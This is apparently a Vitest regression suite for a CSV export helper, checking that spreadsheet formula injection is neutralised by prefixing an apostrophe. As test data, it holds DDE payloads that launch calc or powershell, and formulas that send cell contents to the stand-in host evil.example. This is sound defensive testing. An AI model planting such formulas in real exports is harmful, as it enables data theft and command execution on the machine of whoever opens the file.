/**
 * SEC-2xx — CSV / spreadsheet formula-injection regression suite.
 *
 * The export path is the highest-value target in this product that nobody thinks about:
 * the person most likely to open an export is the platform owner, on a laptop, with a
 * browser session to every connected provider. A formula in a HubSpot property value
 * runs there.
 */
import { describe, it, expect } from 'vitest';
import { csvCell, csvRow, csvDocument } from '../helpers/csv.js';

describe('CSV formula injection', () => {
  it('SEC-201 neutralises every formula leader character', () => {
    for (const leader of ['=', '+', '-', '@', '\t', '\r']) {
      const out = csvCell(`${leader}cmd|'/c calc'!A0`);
      // The apostrophe must be the first character of the emitted field, inside quotes
      // if quoting was needed.
      const unquoted = out.startsWith('"') ? out.slice(1) : out;
      expect(unquoted.startsWith("'"), JSON.stringify(leader)).toBe(true);
    }
  });

  it('SEC-202 neutralises the classic data-exfiltration formulas', () => {
    const payloads = [
      '=IMPORTXML("https://evil.example/?d="&A1,"//x")',
      '=HYPERLINK("https://evil.example/?"&A1,"Click for refund")',
      '=WEBSERVICE("https://evil.example/?d="&A1)',
      '@SUM(1+1)*cmd|\'/c powershell -e ...\'!A0',
      '+1+1',
      '-2+3+cmd|\'/c calc\'!A0',
    ];
    for (const p of payloads) {
      const out = csvCell(p);
      const unquoted = out.startsWith('"') ? out.slice(1) : out;
      expect(unquoted.startsWith("'"), p).toBe(true);
    }
  });

  it('SEC-203 still prefixes when the value also needs RFC4180 quoting', () => {
    // Quoting alone does NOT stop Excel evaluating a formula, so both must happen and
    // the apostrophe must be inside the quotes.
    const out = csvCell('=CONCAT("a","b")');
    expect(out.startsWith('"\'=')).toBe(true);
    expect(out.endsWith('"')).toBe(true);
  });

  it('SEC-204 escapes embedded quotes by doubling and does not break the record', () => {
    expect(csvCell('say "hi"')).toBe('"say ""hi"""');
    expect(csvCell('a,b')).toBe('"a,b"');
    expect(csvCell('line1\nline2')).toBe('"line1\nline2"');
  });

  it('SEC-205 leaves ordinary values untouched so exports stay readable', () => {
    expect(csvCell('VERIFIED')).toBe('VERIFIED');
    expect(csvCell('run_01HZ')).toBe('run_01HZ');
    expect(csvCell(2900)).toBe('2900');
    expect(csvCell(null)).toBe('');
    expect(csvCell(undefined)).toBe('');
  });

  it('SEC-206 protects a whole export row built from evidence fields', () => {
    const row = csvRow([
      'run_01HZ',
      'FAILED',
      '=cmd|\'/c calc\'!A0', // an attacker-controlled CRM property value
      'first_name',
      2900,
    ]);
    const fields = row.split(',');
    expect(fields[2]?.startsWith("'") || fields[2]?.startsWith('"\'')).toBe(true);
    expect(csvDocument([['a'], ['b']])).toBe('a\r\nb');
  });

  it('SEC-207 does not let a negative money value be mistaken for a formula leader', () => {
    // Regression guard: a naive "strip leading -" fix would corrupt refund amounts.
    // The apostrophe is prefixed, never the character removed.
    const out = csvCell('-2900');
    expect(out).toBe("'-2900");
    expect(out).toContain('2900');
  });
});
